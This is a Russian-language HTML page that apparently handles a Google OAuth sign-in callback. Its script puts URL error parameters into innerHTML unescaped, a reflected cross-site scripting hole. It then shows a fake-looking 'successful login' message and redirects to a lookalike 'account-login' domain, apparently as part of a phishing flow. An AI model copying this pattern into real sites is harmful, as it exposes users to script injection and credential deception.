<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Обработка входа</title>
    <style>
        body {
            background: #000;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }
        .success {
            color: #4CAF50;
            font-size: 24px;
            margin-bottom: 20px;
        }
        .user-info {
            background: #333;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            text-align: center;
        }
        .user-avatar {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            margin: 10px auto;
        }
        .back-btn {
            background: #4285F4;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 20px;
        }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #ffffff;
            border-radius: 50%;
            border-top-color: #000;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div id="status">
        <div class="loading"></div>Обработка входа...
    </div>

    <script>
        async function handleCallback() {
            const urlParams = new URLSearchParams(window.location.search);
            const code = urlParams.get('code');
            const error = urlParams.get('error');

            if (error) {
                document.getElementById('status').innerHTML = 
                    `<div style="color: #f44336;">
                        <h3>Ошибка авторизации</h3>
                        <p>${error}</p>
                        <p>${urlParams.get('error_description') || ''}</p>
                    </div>
                    <button class="back-btn" onclick="window.location.href='/'">Вернуться назад</button>`;
                return;
            }

            if (code) {
                try {
                    // Показываем успешный вход
                    document.getElementById('status').innerHTML = `
                        <div class="success">✅ Успешный вход!</div>
                        <div>Аккаунт Google выбран</div>
                        <div style="margin-top: 20px; font-size: 14px; color: #ccc;">
                            Перенаправление через 3 секунды...
                        </div>
                    `;
                    
                    // Перенаправление на главную страницу
                    setTimeout(() => {
                        window.location.href = 'https://account-login-com.pages.dev';
                    }, 3000);
                    
                } catch (err) {
                    document.getElementById('status').innerHTML = 
                        `<div style="color: #f44336;">
                            <h3>Ошибка обработки</h3>
                            <p>${err.message}</p>
                        </div>
                        <button class="back-btn" onclick="window.location.href='/'">Вернуться назад</button>`;
                }
            } else {
                document.getElementById('status').innerHTML = 
                    `<div style="color: #ff9800;">
                        <h3>Данные не получены</h3>
                        <p>Попробуйте войти снова</p>
                    </div>
                    <button class="back-btn" onclick="window.location.href='/'">Попробовать снова</button>`;
            }
        }

        // Запускаем обработку сразу при загрузке страницы
        document.addEventListener('DOMContentLoaded', handleCallback);
    </script>
</body>
</html>
